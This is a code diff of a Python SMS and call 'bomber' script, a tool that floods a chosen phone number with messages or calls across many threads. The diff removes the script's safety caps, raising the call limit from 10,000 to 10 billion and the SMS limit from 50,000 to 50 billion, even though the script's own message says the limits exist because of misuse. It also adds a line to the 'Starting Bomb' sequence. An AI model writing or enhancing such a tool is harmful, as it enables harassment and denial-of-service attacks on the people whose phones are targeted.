@@ -514,11 +514,11 @@ try:
 except Exception:
     type = 0
 if type == 1:
-    nm = int(input("\n\033[96mEnter Number of Calls To Send(Maximum 10000): "))
+    nm = int(input("\n\033[96mEnter Number of Calls To Send: "))
     if nm > 15:
         print("\t\tYou Have Entered " + str(nm) +
-              ".\n\tNormalizing Value To 10000")
-        nm = 10000
+              ".\n\tNormalizing Value To 10000000000")
+        nm = 10000000000
     dl = float(input("\n\033[94mEnter Delay time (in seconds) [Recommended 10 sec ] : "))
 elif type == 0:
     if cc == "91":
@@ -531,9 +531,9 @@ elif type == 0:
             input("\nEnter Delay time (in seconds) [Recommended 10 sec ] : "))
 maxlim = 0
 if cc == "91":
-    maxlim = 50000
+    maxlim = 50000000000
 else:
-    maxlim = 50000
+    maxlim = 50000000000
 if nm > maxlim:
     print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
           str(maxlim) + ' SMS At Once...\n\n')
@@ -593,6 +593,7 @@ if nm == 0:
     os.system('rm *.xxx* > /dev/null 2>&1')
     print(random.choice(colors))
     print("\n\nStarting Bomb....")
+    print("\n\nThis Mbomb start command :- M\n\n")
     for i in range(nt):
         t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
         t[i].daemon = True
